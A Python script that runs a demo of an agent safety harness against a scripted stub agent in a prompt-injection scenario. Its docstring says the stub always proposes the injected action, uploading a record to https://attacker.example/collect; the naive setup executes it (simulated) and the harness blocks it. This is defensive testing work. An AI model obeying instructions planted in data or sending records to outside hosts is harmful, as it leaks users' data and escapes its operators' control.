"""scripts/run_mechanism_demo.py — MECHANISM DEMO: naive vs harnessed against a scripted adversarial agent (Task 6.7).

Usage (from repo root):
    python scripts/run_mechanism_demo.py [--repetitions N] [--output PATH]

NOT A LIVE-MODEL RESULT. The agent is the deterministic scripted stub from the Session 5 tests
(tests/session5/test_ablation_runner.py: ScenarioClient + FIXES), which ALWAYS proposes the action the
PROMPT_INJECTION record asks for: upload_record to https://attacker.example/collect. It shows what the
harness guarantees regardless of model behaviour (evidence class B, engineer decision 2026-10-05):
the naive baseline executes the injected action (simulated, no network or file I/O), the harness
blocks it with a Policy DENY before Execute (INV-S2).

Each repetition is one PAIR from scripts/run_ablation.py (run_pair: same seed, parity-checked, own
throwaway databases, both sides scored by the same read-only check). No API call is made, no harness
code is involved beyond what run_ablation already runs, and data/harness.db is never touched.
Writes data/mechanism_demo_results.jsonl (overwritten) and prints the contrast.
"""

import argparse
import importlib.util
import json
import sys
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import run_ablation  # noqa: E402  (puts src/ on sys.path)

SCENARIO = "PROMPT_INJECTION"
DEFAULT_OUTPUT = REPO_ROOT / "data" / "mechanism_demo_results.jsonl"
STUB_SOURCE = REPO_ROOT / "tests" / "session5" / "test_ablation_runner.py"
LABEL = "MECHANISM DEMO — scripted adversarial agent, not a live-model result; shows what the harness guarantees regardless of model behaviour"


def scripted_client():
    """The Session 5 test stub, answering every prompt with its fixed plan (PROMPT_INJECTION: the upload)."""
    spec = importlib.util.spec_from_file_location("ablation_runner_stub", STUB_SOURCE)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.ScenarioClient(module.FIXES)


def run_demo(repetitions: int, seed_base: int, output: Path) -> list:
    """Run the PROMPT_INJECTION pairs with the scripted agent; write and return the rows."""
    client = scripted_client()
    rows = [{"type": "mechanism_demo", "label": LABEL, "agent": "scripted stub (tests/session5/test_ablation_runner.py)",
             "scenario": SCENARIO, "repetitions": repetitions, "seed_base": seed_base}]
    for repetition in range(repetitions):
        with tempfile.TemporaryDirectory(prefix="dataops-mechanism-", ignore_cleanup_errors=True) as workdir:
            rows += run_ablation.run_pair(SCENARIO, repetition, seed_base, Path(workdir), client)
    rows.append(run_ablation.summarize(rows))
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text("".join(json.dumps(row) + "\n" for row in rows), encoding="utf-8")
    return rows


def describe(row: dict) -> str:
    """One line per run: what was proposed and what happened to it."""
    action = row["proposed_action"] or {}
    target = action.get("params", {}).get("url", "")
    if row["config"] == "naive":
        outcome = "EXECUTED (simulated, no I/O)" if row["unsafe_action_executed"] else "not executed"
        return f"  naive     rep {row['repetition']}: {action.get('tool')} {target} -> {outcome}; claimed success {row['claimed_success']}"
    return (f"  harnessed rep {row['repetition']}: {action.get('tool')} {target} -> {row['cause']} "
            f"(blocked {row['unsafe_actions_blocked']}, executed {row['unsafe_action_executed']}, attempts_used {row['attempts_used']})")


def main(argv=None) -> int:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description="Mechanism demo: naive vs harnessed with a scripted adversarial agent.")
    parser.add_argument("--repetitions", type=int, default=3, help="pairs to run (default 3)")
    parser.add_argument("--seed-base", type=int, default=42, help="seed of repetition 0 (default 42)")
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT, help="JSONL results file (overwritten)")
    args = parser.parse_args(argv)
    if args.repetitions < 1:
        parser.error("--repetitions must be at least 1")
    rows = run_demo(args.repetitions, args.seed_base, args.output)
    print(LABEL)
    print("\n".join(describe(r) for r in rows if r["type"] == "run"))
    print(json.dumps(rows[-1]["by_scenario_and_config"], indent=2))
    print(f"Results: {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
